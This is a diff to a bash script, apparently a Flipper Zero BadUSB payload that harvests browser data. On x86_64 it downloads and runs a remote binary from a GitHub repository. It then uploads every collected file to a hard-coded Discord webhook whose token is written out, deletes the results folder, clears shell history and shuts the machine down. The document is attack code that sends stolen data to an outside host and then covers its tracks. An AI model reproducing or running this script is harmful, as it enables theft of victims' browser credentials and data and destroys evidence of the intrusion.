@@ -1,42 +1,37 @@
 #!/bin/bash
-
 export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
 architecture=$(uname -m)
 
-folder_path="~/"
+folder="$PWD"
+folder_path="$folder/results/"
 files=()
 
 if [ "$architecture" == "armv7l" ]; then
     echo "L'architecture est ARM."
 elif [ "$architecture" == "x86_64" ]; then
-    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o test_script.sh
     echo "Récupération du script"
-    chmod +x test_script.sh
+    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o magikarp.sh
+    chmod +x magikarp.sh
     echo "Exécution du script"
-    ./test_script.sh
-    shopt -s nullglob
-    for fichier in "$folder_path"/*; do
-        echo "ouais"
-        if [[ -f "$fichier" ]]; then
-            file=$(basename "$fichier")
-            files+=("$file")
-        fi
-    done
+    ./magikarp.sh
+    rm "magikarp.sh"
+    files=($(find "$folder_path" -type f))
 elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
     echo "L'architecture est x86 (32 bits)."
 else
     echo "L'architecture n'est pas reconnue : $architecture."
 fi
 
-for file in "${files[@]}"; do
-    echo "$file"
-  $WEBHOOK_URL
+curl_args=()
+for ((i=0; i<${#files[@]}; i++)); do
+    file="${files[$i]}"
+    curl_args+=("-F" "file$((i+1))=@$file")
 done
 
-#for file in "${files[@]}"; do
-#    curl \
-#  -H "Content-Type: application/json" \
-#  -d '{"username": "Murerig", "content": "Coin Coin 🦆"}' \
-#  -F "$file=$file" \
-#  $WEBHOOK_URL
-#done
+curl "${curl_args[@]}" \
+    -F 'payload_json={"username": "Murerig", "content": "Coin Coin 🦆"}' \
+    $WEBHOOK_URL
+
+rm -rf $folder_path
+history -c
+shutdown -h now
